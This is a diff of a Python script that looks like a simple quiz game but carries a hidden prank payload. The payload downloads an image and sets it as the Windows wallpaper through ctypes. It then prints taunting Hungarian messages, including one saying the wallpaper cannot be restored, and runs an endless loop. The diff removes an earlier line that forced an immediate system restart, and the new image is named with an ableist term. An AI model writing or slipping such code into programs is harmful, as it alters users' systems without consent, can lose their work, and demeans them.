@@ -23,8 +23,7 @@ elif choice == "2":
         print("That was right!")
 import ctypes, urllib.request, os, time
 
-# 1. Kép letöltése (User-Agent-tel a 403-as hiba ellen)
-url = "https://wallpaperaccess.com/full/2022519.jpg"
+url = "https://static.india.com/wp-content/uploads/2016/01/autism.jpg"
 kep_utvonal = os.path.join(os.getenv("TEMP"), "hatter.jpg")
 
 opener = urllib.request.build_opener()
@@ -33,11 +32,26 @@ urllib.request.install_opener(opener)
 
 try:
     urllib.request.urlretrieve(url, kep_utvonal)
-    # 2. Háttérkép beállítása
+  
     ctypes.windll.user32.SystemParametersInfoW(20, 0, kep_utvonal, 3)
     
-    # 3. Várakozás 5 másodpercig (hogy látszódjon a kép)
+   
     time.sleep(5)
 except:
-    pass # Ha nincs net, ne csináljon semmit
-import os; os.system("shutdown /r /f /t 0")
+    pass 
+print("Na mivan? Pelenka csere kell? ;) ")
+time.sleep(2)
+print("Ezert nem nyitunk meg random faljokat, mert lehet benne egy ilyen szar is! ")
+time.sleep(2)
+print("Ugyhogy ja HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAAHAHAAHAHAAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAAHAHAA")
+time.sleep(2)
+print("Na most a wallpapert nem kapod vissza ")
+time.sleep(2)
+print("Azt hitted hogy ennyi mi lesz? Nem, most jon a tobbi! ")
+time.sleep(2)
+try:
+    while True:
+        print("Innen nincs kiszállás... ddnemet")
+        time.sleep(1)
+except KeyboardInterrupt:
+    pass
